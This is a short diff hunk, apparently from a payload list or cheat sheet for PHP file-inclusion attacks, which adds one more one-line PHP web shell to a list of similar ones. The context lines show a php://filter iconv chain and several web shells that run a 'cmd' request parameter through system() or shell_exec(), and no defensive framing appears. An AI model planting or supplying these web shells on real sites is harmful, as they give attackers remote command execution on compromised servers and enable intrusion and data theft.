@@ -284,6 +284,7 @@ php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.
 <?php system($_REQUEST['cmd']); ?>
 <?php echo shell_exec($_GET['cmd']); ?>
 <pre><?php system($_GET['cmd']); ?></pre>
+<pre><h1><?php system($_GET['cmd']); ?></h1></pre>
 <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
 ```
 
